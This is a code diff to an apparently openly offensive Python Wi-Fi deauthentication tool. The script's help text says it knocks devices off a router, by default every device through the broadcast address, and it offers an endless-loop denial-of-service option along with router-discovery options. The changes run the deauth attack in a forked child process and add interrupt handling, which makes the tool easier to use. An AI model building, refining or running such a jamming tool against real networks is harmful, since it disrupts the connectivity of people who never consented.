@@ -122,7 +122,12 @@ def checkParameters(args):
                     input('')
                     os.kill(newpid, signal.SIGKILL)
             else:
-                deauth(macVictim, args.interface, args.bssid)
+                newpid = os.fork()
+                if newpid == 0:
+                    deauth(macVictim, args.interface, args.bssid)
+                else:
+                    input('')
+                    os.kill(newpid, signal.SIGKILL)
 
 
 if __name__ == "__main__":
@@ -130,13 +135,13 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="This script deauthenticates a device from a router. It can be used to with all devices (ff:ff:ff:ff:ff:ff).\n"
                     "Prerequisites: You and your victim need to have wifi. ")
-    ######################################################################################################################
+    ##########################################################################################
     parser.add_argument("-v", "--victim", required=False,
                         help="Victim MAC address. Default ff:ff:ff:ff:ff:ff (send to broadcast, it will affect all devices connected by wifi)")  # default ff:ff:ff:ff:ff:ff
     parser.add_argument("-i", "--interface", required=True, help="Network interface")
     parser.add_argument("-b", "--bssid", required=False, help="Gateway MAC address")
     parser.add_argument("-d", "--dos", required=False, action="store_true", help="This option put de deauthentication function in an endless loop")
-    #####################################################################################################
+    ###########################################################################################
     parser.add_argument("-g", "--getMacBssid", required=False, action='store_true',
                         help="This options get the MAC of the router you are connected to and more information about it")
     parser.add_argument("-a", "--getAllBssid", required=False, action='store_true',
@@ -146,5 +151,7 @@ if __name__ == "__main__":
     parser.add_argument("-mg", "--managedMode", required=False, action='store_true',
                         help="This option put your interface in managed mode")
     args = parser.parse_args()
-
-    checkParameters(args)
+    try:
+        checkParameters(args)
+    except KeyboardInterrupt:
+        pass
